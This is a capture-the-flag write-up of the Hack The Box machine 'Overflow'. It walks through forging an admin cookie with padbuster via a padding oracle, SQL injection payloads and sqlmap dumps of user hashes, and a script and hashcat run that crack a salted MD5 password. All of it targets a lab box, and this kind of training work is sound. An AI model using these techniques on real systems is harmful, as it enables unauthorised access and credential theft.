---
title: HTB: Overflow
url: https://0xdf.gitlab.io/2022/04/09/htb-overflow.html
date: 2022-04-09T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-overflow, ctf, nmap, ubuntu, cookies, padding-oracle, python, feroxbuster, padbuster, vhosts, sqli, sqlmap, hashcat, cmsmadesimple, cve-2021-22204, exiftool, password-reuse, facl, getfacl, hosts, time-of-check-time-of-use, ghidra, bof, crypto, gdb, youtube, htb-lazy
---

![Overflow](https://0xdfimages.gitlab.io/img/overflow-cover.png)

Overflow starts with a padding oracle attack on a cookie for a website. I’ll get to do some need cookie analysis before employing padbuster to decrypt the cookie and forge a new admin one. As admin, I get access to a logs panel with an SQL injection, where I can dump the db and crack the password to log into the CMS as well as a new virtual host with job adds. I’ll submit a malicious image that exploits a CVE in exiftool to get a shell. I’ll pivot to the next user with a credential from the web source. The next user is regularly running a script that pulls from another domain. With access to the hosts file, I’ll direct that domain to my machine and get execution. Finally, to get root, I’ll exploit a buffer overflow and a time of check / time of use vulnerability to get arbitrary read as root, and leverage that to get a shell.

## Box Info

| Name | [Overflow](https://hackthebox.com/machines/overflow)  [Overflow](https://hackthebox.com/machines/overflow) [Play on HackTheBox](https://hackthebox.com/machines/overflow) |
| --- | --- |
| Release Date | [23 Oct 2021](https://twitter.com/hackthebox_eu/status/1451210426805538818) |
| Retire Date | 09 Apr 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Overflow |
| Radar Graph | Radar chart for Overflow |
| First Blood User | 01:33:14[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 02:01:30[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [Xclow3n Xclow3n](https://app.hackthebox.com/users/172213) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.119
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 16:06 EDT
Nmap scan report for 10.10.11.119
Host is up (0.12s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 94.61 seconds
oxdf@hacky$ nmap -p 22,25,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.119
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 16:08 EDT
Nmap scan report for 10.10.11.119
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Overflow Sec
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.48 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 Bionic.

SMTP is open, which means I may be able to brute force usernames should I need to, or send email so I’ll keep an eye out for phishing opporunities.

### Website - TCP 80

#### Site

The site is for a security company:

[![image-20210929145658644](https://0xdfimages.gitlab.io/img/image-20210929145658644.png)](https://0xdfimages.gitlab.io/img/image-20210929145658644.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210929145658644.png)

There’s not much there other than “Sign In” and “Sign Up” links, and a “Contact Us” form at the bottom. Submitting the “Contact Us” form just sends a GET to `/?`, so it doesn’t do anything.

The Login link goes to `/login.php`:

![image-20210927162034997](https://0xdfimages.gitlab.io/img/image-20210927162034997.png)

“Sign Up” leads to `register.php`:

![image-20210927162102159](https://0xdfimages.gitlab.io/img/image-20210927162102159.png)

No quick wins from either with a bit of poking at them. Simple SQL injections didn’t work. There’s no difference in the error messages with admin vs 0xdf as a username, which suggests that I can’t enumerate users with the form. That said, if I try to register as admin, it just returns the registration page, whereas any successful registration gets a 302, so I could enumerate users that way.

#### Logged In

I’ll register an account, which redirects back to `/home/index.php`, which is the front page. It’s the same as before, but the menu bar has more options:

![image-20210927162350865](https://0xdfimages.gitlab.io/img/image-20210927162350865.png)

`/home/profile/` gives a profile page, but the buttons don’t do anything:

![image-20210927162510334](https://0xdfimages.gitlab.io/img/image-20210927162510334.png)

`/home/blog.php` has four blog posts, but again, the read more buttons don’t lead anywhere, nor do any of the links:

[![image-20210927162635319](https://0xdfimages.gitlab.io/img/image-20210927162635319.png)](https://0xdfimages.gitlab.io/img/image-20210927162635319.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210927162635319.png)

The “Pricing” link leads back to the main page.

`/logout.php` deletes the `auth` cookie and returns a 302 to the home page:

```

HTTP/1.1 302 Found
Date: Mon, 27 Sep 2021 20:27:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: auth=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
Location: index.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

#### Tech Stack

The site is running on Apache and PHP. On logging in, it does set a cookie, `auth`:

```

HTTP/1.1 302 Found
Date: Mon, 27 Sep 2021 20:35:49 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: auth=%2BV8hGOLZMNZVo81T4JCViBrSlRK1Kyof
Location: home/index.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

It looks like a Base64 alphabet, but decoding the cookie doesn’t result in anything interesting. It’s worth noting that the cookie size seems to change based on the username. The above cookie is for username 0xdf. After trying some different names and noting the change in cookie length, I’ll write a quick script to test this:

```

#!/usr/bin/env python3

import random
import requests
import string
from base64 import b64decode
from urllib.parse import unquote

url = "http://10.10.11.119/register.php"

prev = 0
print(f'Name len   base64 c len   raw c len')
for i in range(1, 50):
    name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(i))
    resp = requests.post(url, data={"username": name, "password": "aaaaa", "password2": "aaaaa"}, allow_redirects=False)
    b64_cookie = unquote(resp.cookies["auth"])
    raw_cookie = b64decode(b64_cookie)
    if len(b64_cookie) != prev:
        print(f'{len(name):^8}   {len(b64_cookie):^12}   {len(raw_cookie):^9}')
        prev = len(b64_cookie)

```

It will loop from 1 to 50, creating a random string of that length, then submitting that as the username and fetching the cookie that’s set as a result. It URL decodes the cookie, and looks at the length. If the length is different from the previous one, it prints it, as well as the length of the base64-decoded cookie:

```

oxdf@hacky$ python test_cookie.py 
Name len   base64 c len   raw c len
   1            24           16    
   3            32           24    
   11           44           32    
   19           56           40    
   27           64           48    
   35           76           56    
   43           88           64 

```

This tells me that the username is included in the cookie, and there’s some kind of block cipher being used to encrypt the data. The block size is 8, as that is the jump in size on the raw cookie.

I’ll also notice that the cookie is different each time I log in as the same user. It’s likely that the cookie is using an IV for the encryption.

Putting all this together, I can guess at the structure of this cookie (I don’t need to, but I can). The IV would be a multiple of eight, so it’s almost certainly eight bytes. Because of how these block ciphers work, there has to be padding. So if the data is seven bytes, there’s one byte of padding. But with eight, there’s eight bytes of padding. I know when the username is three characters, the full cookie jumps up to 24 bytes. Eight is IV, eight is padding, and three is username. That leaves five bytes of static data in the cookie, probably something like “user=” or “name=”.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.119 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.119
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       54l      104w     2017c http://10.10.11.119/login.php
302        0l        0w        0c http://10.10.11.119/logout.php
200       55l      113w     2198c http://10.10.11.119/register.php
301        9l       28w      313c http://10.10.11.119/config
301        9l       28w      311c http://10.10.11.119/home
200       99l      273w     3076c http://10.10.11.119/home/blog.php
200        1l        1w       14c http://10.10.11.119/home/logs.php
200        0l        0w        0c http://10.10.11.119/config/db.php
200      299l      904w        0c http://10.10.11.119/index.php
200        0l        0w        0c http://10.10.11.119/config/users.php
200        0l        0w        0c http://10.10.11.119/config/auth.php
301        9l       28w      319c http://10.10.11.119/home/profile
302      290l      889w        0c http://10.10.11.119/home/index.php
302       69l      126w     2503c http://10.10.11.119/home/profile/index.php
403        9l       28w      277c http://10.10.11.119/server-status
[####################] - 4m    239992/239992  0s      found:15      errors:278    
[####################] - 4m     59998/59998   243/s   http://10.10.11.119
[####################] - 4m     59998/59998   245/s   http://10.10.11.119/config
[####################] - 4m     59998/59998   246/s   http://10.10.11.119/home
[####################] - 4m     59998/59998   238/s   http://10.10.11.119/home/profile

```

The pages in `/config` return empty responses (as `feroxbuster` shows, 0 lines, 0 words).

`/home/logs.php` returns a 200 with just a body of “Unauthorized”:

```

HTTP/1.1 200 OK
Date: Mon, 27 Sep 2021 20:52:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 14
Connection: close
Content-Type: text/html; charset=UTF-8

Unauthorized!!

```

That implies there’s perhaps some kind of admin access.

## Shell as www-data

### Web as Admin

#### Break Cookie

If I log in and then try to get `/home` with a modified cookie, it breaks. Here I deleted the last character of the cookie, and it returns:

```

HTTP/1.1 302 Found
Date: Mon, 27 Sep 2021 20:55:40 GMT
Server: Apache/2.4.29 (Ubuntu)
location: ../logout.php?err=1
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

If I follow the redirection to `/logout.php?err=1`, it sets the cookie to “deleted” and redirects again:

```

HTTP/1.1 302 Found
Date: Mon, 27 Sep 2021 20:57:35 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: auth=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
Location: ./login.php?err=1
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

Visiting `/login.php?err=1` includes an error message at the top of the page (actually before the opening `<html>` tag):

```

HTTP/1.1 200 OK
Date: Mon, 27 Sep 2021 20:57:35 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2102
Connection: close
Content-Type: text/html; charset=UTF-8

<span class=error>Unable to Verify cookie! Invalid padding. Please login Again</span><html>
    <title>Overflow Sec
...[snip]...

```

It shows up on the top of the page:

![image-20210927165941658](https://0xdfimages.gitlab.io/img/image-20210927165941658.png)

I tried some other numbers for `err`, but only `1` seems to exist.

“Invalid padding” is really interesting.

#### Padding Oracle Attack

When there’s some encrypted object that leaks information about if the padding is good or not, I can attack that with a Padding Oracle Attack. I went into detail on how this attack works in the [Lazy](/2020/07/29/htb-lazy.html#path-1-padding-oracle-attack) writeup, so check out that for a full background. The really short version is that because it tells me when the padding is bad, I can brute force across the bytes of the cookie to read the decrypted plaintext, as well as create a cookie with different plaintext.

I’ll use `padbuster`(comes installed on Parrot and I believe Kali) to automate this. I’ll give it the following options:
- The URL to target - `http://10.10.11.119/home/index.php`
- A valid cookie for the “EncryptedSample” - `k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU`
- The block size is typically 8 or 16; 16 errors out immediately, but 8 doesn’t
- `-cookie auth=k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU` - tells it to pass the encrypted item as a cookie

When I give it those options, it starts by running what it calls a response analysis. This is it will try 256 different bytes at one spot in the cookie, and report what the responses look like:

```

oxdf@hacky$ padbuster http://10.10.11.119/ k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU 8 -cookie auth=k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU
+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: home/index.php
[+] Content Length: 16378

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis
*** Response Analysis Complete ***

The following response signatures were returned:
-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     16378   N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended:

```

In this case, number 1 returns a 200 (the page) for one of the cookies, and number 2 returns a 302 to `logout.php` for the other 255 cookies. It’s asking which is the error (and suggesting 2). I agree, so I’ll enter 2. Now it will continue brute-forcing the bytes of the cookie to get the plaintext:

```

NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (188/256) [Byte 8]
[+] Success: (89/256) [Byte 7]
[+] Success: (24/256) [Byte 6]
[+] Success: (168/256) [Byte 5]
[+] Success: (78/256) [Byte 4]
[+] Success: (174/256) [Byte 3]
[+] Success: (73/256) [Byte 2]
[+] Success: (18/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 5b4f1f86ec7e9568
[+] Intermediate Bytes (HEX): e6b054b75ceba545
[+] Plain Text: user=0xd
*** Starting Block 2 of 2 ***

[+] Success: (146/256) [Byte 8]
[+] Success: (112/256) [Byte 7]
[+] Success: (134/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (124/256) [Byte 4]
[+] Success: (226/256) [Byte 3]
[+] Success: (177/256) [Byte 2]
[+] Success: (203/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): c7dce25292e93514
[+] Intermediate Bytes (HEX): 3d481881eb79926f
[+] Plain Text: f
-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=0xdf

[+] Decrypted value (HEX): 757365723D3078646607070707070707

[+] Decrypted value (Base64): dXNlcj0weGRmBwcHBwcHBw==
-------------------------------------------------------

```

It takes several minutes, but it gets the full decrypted cookie. I’ll note that my guess from [above](#tech-stack) was correct, the cookie is of the form “user=[username]”.

Knowing what the underlying plaintext looks like, now I can run it again with `-plain user=admin` to get back a valid cookie with that plaintext:

```

oxdf@hacky$ padbuster http://10.10.11.119/ k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU 8 -cookie auth=k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU -plaintext user=admin
+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: home/index.php
[+] Content Length: 13389

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis
*** Response Analysis Complete ***

The following response signatures were returned:
-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     13389   N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
[+] Success: (150/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

[+] Success: (1/256) [Byte 8]
[+] Success: (36/256) [Byte 7]
[+] Success: (180/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (146/256) [Byte 4]
[+] Success: (50/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (135/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe
-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------

```

When I set that to my cookie in Firefox and refresh, there’s a new menu bar:

![image-20210927195536003](https://0xdfimages.gitlab.io/img/image-20210927195536003.png)

### DB Access

#### Enumeration as Admin

The “Admin Panel” link leads to `http://10.10.11.119/admin_cms_panel/admin/login.php`, which is a login page for an instance of [CMS Made Simple](http://www.cmsmadesimple.org/):

![image-20210928122307248](https://0xdfimages.gitlab.io/img/image-20210928122307248.png)

Despite having admin access to the main site, I don’t have the password for admin at this time, so I can’t find any way past this form.

The “Logs” link leads to `http://10.10.11.119/home/index.php#popup1`, which creates a popup that says “Undefined”:

![image-20210928122657857](https://0xdfimages.gitlab.io/img/image-20210928122657857.png)

Clicking the “Logs” link doesn’t lead to any network activity, but looking back at the main page load, there is one thing that jumps out at me as different now that I’m admin:

![image-20210928131318128](https://0xdfimages.gitlab.io/img/image-20210928131318128.png)

It’s trying to get `http://overflow.htb/home/logs.php?name=admin`, but failing as I don’t have DNS for that domain. I’ll add it to `/etc/hosts`. If I just refresh visiting `10.10.11.119`, it won’t send the cookie, and what comes back is a 200 that says “Unauthorized!!”:

```

HTTP/1.1 200 OK
Date: Tue, 28 Sep 2021 17:14:08 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 14
Connection: close
Content-Type: text/html; charset=UTF-8

Unauthorized!!

```

Once I switch the entire page over to `overflow.htb`, the request returns data:

```

HTTP/1.1 200 OK
Date: Tue, 28 Sep 2021 17:21:32 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 235
Connection: close
Content-Type: text/html; charset=UTF-8

<div id='last'>Last login : 10:00:00</div><br> <div id='last'>Last login : 11:00:00</div><br> <div id='last'>Last login : 12:00:00</div><br> <div id='last'>Last login : 14:00:00</div><br> <div id='last'>Last login : 16:00:00</div><br>

```

Now clicking on “Logs” returns:

![image-20210928132249274](https://0xdfimages.gitlab.io/img/image-20210928132249274.png)

#### SQLi

I’ll send that request over to Burp Repeater, and play with it a bit. Changing the name from admin to 0xdf just returned a blank payload.

`admin'` returned a 500 Internal Server Error. This response is a great sign of potential SQL injection. I can guess that the query is something like:

```

select login_times from logins where username = [input];

```

If that’s the case, then sending `admin';-- -` could fix it because it’ll close the `'`, end the statement with `;`, and make the rest a comment with `-- -`. `name=admin'%3b--+-` doesn’t fix it, as it still returns 500.

Sometimes queries use `()`, and it’s important to balance those as well. I’ll try `');-- -` (url encodes to `admin')%3b--+-`), and it works:

[![image-20210928132900698](https://0xdfimages.gitlab.io/img/image-20210928132900698.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210928132900698.png)

I can check for union injection by adding `admin') union select 1;-- -` then `select 1,2`, etc until it doesn’t crash. It seems the right number of columns is three, and I know that the timestamp is in the third column because of the record that comes back with a `Last login : 3`:

[![image-20210928133425298](https://0xdfimages.gitlab.io/img/image-20210928133425298.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210928133425298.png)

#### sqlmap

Doing this enumeration in Repeater from this point is annoying, so I’ll pivot to `sqlmap`. I’ll save the clean (no SQL injection) request to a file from Burp with right-click “Copy to file”. Now I can give that to `sqlmap` and let it find the same injection:

```

oxdf@hacky$ sqlmap -r logs.php.request
...[snip]...
[13:49:55] [INFO] GET parameter 'name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=admin') AND 1081=1081 AND ('fFTi'='fFTi

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: name=admin') OR (SELECT 8283 FROM (SELECT(SLEEP(5)))Uyda) AND ('jpVt'='jpVt

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: name=admin') UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7171,0x42676d6d686b6b5452657553507950506a6f6e62636662536d796450626944475270784f62646e4a,0x71717a7071)-- -
---
[13:51:32] [INFO] the back-end DBMS is MySQL
[13:51:32] [CRITICAL] unable to connect to the target URL ('Broken pipe'). sqlmap is going to retry the request(s)
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
...[snip]...

```

Next I’ll list the DBs:

```

oxdf@hacky$ sqlmap -r logs.php.request --dbs
...[snip]...
available databases [4]:
[*] cmsmsdb
[*] information_schema
[*] logs
[*] Overflow
...[snip]...

```

With `-D logs --tables` it shows only one table, `userlog`.

`-D logs -T userlog --dump` shows the logins:

```

Database: logs
Table: userlog
[12 entries]
+----+----------+-----------+
| id | USERNAME | Lastlogin |
+----+----------+-----------+
| 1  | admin    | 11:00:00  |
| 2  | editor   | 10:00:00  |
| 3  | Mark     | 13:00:00  |
| 4  | Diana    | 15:00:00  |
| 5  | Tester   | 16:00:00  |
| 6  | super    | 20:00:00  |
| 7  | frost    | 08:00:00  |
| 8  | Corp     | 10:00:00  |
| 9  | admin    | 14:00:00  |
| 10 | admin    | 16:00:00  |
| 11 | admin    | 10:00:00  |
| 12 | admin    | 12:00:00  |
+----+----------+-----------+

```

Nothing interesting there.

`Overflow` has a single table, `users`, with another user and hash:

```

Database: Overflow
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| c71d60439ed5590b3c5e99d95ed48165 | admin    |
+----------------------------------+----------+

```

`cmsmsdb` has a ton of tables, which makes sense for a real CMS. `cms_users` has two users:

```

Database: cmsmsdb
Table: cms_users
[2 entries]
+---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
| user_id | email              | active | password                         | username | last_name | first_name | create_date         | admin_access | modified_date       |
+---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
| 1       | admin@overflow.htb | 1      | c6c6b9310e0e6f3eb3ffeb2baff12fdd | admin    | <blank>   | <blank>    | 2021-05-24 21:18:35 | 1            | 2021-05-26 14:49:15 |
| 3       | <blank>            | 1      | e3d748d58b58657bfa4dffe2def0b1c7 | editor   | <blank>   | editor     | 2021-05-25 06:38:33 | 1            | 2021-05-26 04:13:58 |
+---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+

```

### Crack Hashes

#### Initial Fail

I’ll try `hashcat` to break these hashes. All three are MD5s, but none crack with the `rockyou.txt` wordlist:

```

$ hashcat -m 0 hashes.md5 /usr/share/wordlists/rockyou.txt 
hashcat (v5.1.0) starting...
...[snip]...

```

Either they are using really strong passwords, or there’s some kind of salt I don’t have.

#### Source Analysis

The download page for [CMS Made Simple](http://www.cmsmadesimple.org/downloads/cmsms) has an installer script, but it also has a link to get the source for Subversion. I’ll download using `svn co`, which is like `git clone` but for Subversion:

```

svn co http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk

```

I want to find the hash algorithm, and some `grep` leads to `./lib/classes/class.user.inc.php`:

```

        function SetPassword($password)
        {
                $this->password = md5(get_site_preference('sitemask','').$password);
        }    

```

The hash that is stored is prepended with a sitemask, which looks a lot like a single salt across the entire site to prevent me from just what I’m trying to do, dumping the users table and cracking the hashes. To find what it is, I’ll need to understand `get_site_preference`, which is defined in `./lib/page.functions.php`:

```

oxdf@hacky$ grep -r 'function get_site_preference' .
./lib/page.functions.php:function get_site_preference($prefname, $defaultvalue = '')
./.svn/pristine/8a/8a49c13bd1c68565b732bbe63a2396726f77fdfc.svn-base:function get_site_preference($prefname, $defaultvalue = '')

```

The code looks like:

```

function get_site_preference($prefname, $defaultvalue = '')
{
  return cms_siteprefs::get($prefname,$defaultvalue);
}    

```

I want to find where the `cms_siteprefs` class is defined:

```

oxdf@hacky$ grep -r 'class cms_siteprefs' .
./lib/classes/class.cms_siteprefs.php:final class cms_siteprefs
./.svn/pristine/73/73661ab3d7272aad0cc11c6acd69ffe448146d9f.svn-base:final class cms_siteprefs

```

The `cms_siteprefs` function `get` pulls it from a cache object:

```

    /**    
     * Retrieve a site preference    
     *    
     * @param string $key The preference name    
     * @param string $dflt Optional default value    
     * @return string    
     */    
    public static function get($key,$dflt = '')    
    {    
        $prefs = global_cache::get(__CLASS__);    
        if( isset($prefs[$key]) )  return $prefs[$key];    
        return $dflt;    
    }    

```

It is passing in the `__CLASS__` variable, which will be `cms_siteprefs`. The class’ `setup` function also calls `self::_read()`:

```

    private static function _read()    
    {    
        $db = CmsApp::get_instance()->GetDb();    
    
        if( !$db ) return;    
        $query = 'SELECT sitepref_name,sitepref_value FROM '.CMS_DB_PREFIX.'siteprefs';    
        $dbr = $db->GetArray($query);    
        if( is_array($dbr) ) {    
            $_prefs = array();    
            for( $i = 0, $n = count($dbr); $i < $n; $i++ ) {    
                $row = $dbr[$i];    
                $_prefs[$row['sitepref_name']] = $row['sitepref_value'];    
            }    
            return $_prefs;    
        }    
    }    

```

It is connecting to the DB and pulling `[prefix]siteprefs`. Given that all the tables in that DB start with `cms_`, that seems like a reasonable place to start.

When I dump that table with `sqlmap -r logs.php.request --dump -D cmsmsdb -T cms_siteprefs`, there are 37 rows, but the first one is what I need:

```

Database: cmsmsdb
Table: cms_siteprefs
[37 entries]
+---------------------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sitepref_name                               | sitepref_value                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+---------------------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sitemask                                    | 6c2d17f37e226486                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
...[snip]...
+---------------------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

The `sitemask` is “6c2d17f37e226486”.

#### Crack with Python

I’ll write a quick Python script to crack the hashes with the sitemask:

```

#!/usr/bin/env python3    
    
import hashlib     
import sys    

hashes = {"c6c6b9310e0e6f3eb3ffeb2baff12fdd": "admin",     
          "e3d748d58b58657bfa4dffe2def0b1c7": "editor"}     
sitemask = b"6c2d17f37e226486"                           
                                  
with open(sys.argv[1], 'rb') as wordlist:    
    for word in wordlist:                    
        word = word.strip()                                                   
        h = hashlib.md5(sitemask + word).hexdigest()              
        if h in hashes:                                         
            print(f'Password for {hashes[h]}: {word.decode()}') 

```

It will loop over the lines in the file specified by the first argument, remove the trailing whitespace, hash the sitemask + word, and then check if the hash is one of the ones I’m looking for. It does all of `rockyou.txt` in seven seconds in my VM, finding the password for editor:

```

oxdf@hacky$ time python crack.py /usr/share/wordlists/rockyou.txt 
Password for editor: alpha!@#$%bravo

real    0m7.250s
user    0m7.241s
sys     0m0.009s

```

#### Crack with Hashcat

Hashcat has a [mode 20](https://hashcat.net/wiki/doku.php?id=example_hashes) which is `md5($salt.$pass)`, and I just [need to pass](https://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/) the format [hash]:[salt]. Easy enough, I’ll create a file hashes in that format:

```

$ cat hashes.md5 
c6c6b9310e0e6f3eb3ffeb2baff12fdd:6c2d17f37e226486
e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486
$ hashcat -m 20 hashes.md5 /usr/share/wordlists/rockyou.txt 
...[snip]...
e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo
...[snip]...

```

### Enumerate CMS

At the login form, the creds for editor work, and I’m into the admin console:

![image-20210928143716922](https://0xdfimages.gitlab.io/img/image-20210928143716922.png)

Clicking around, there isn’t much here. But under Extensions, there’s a link to “User Defined Tags”:

![image-20210928143943033](https://0xdfimages.gitlab.io/img/image-20210928143943033.png)

There’s one there currently:

![image-20220406203300202](https://0xdfimages.gitlab.io/img/image-20220406203300202.png)

That’s a strong hint to go look at `devbuild-job.overflow.htb`.

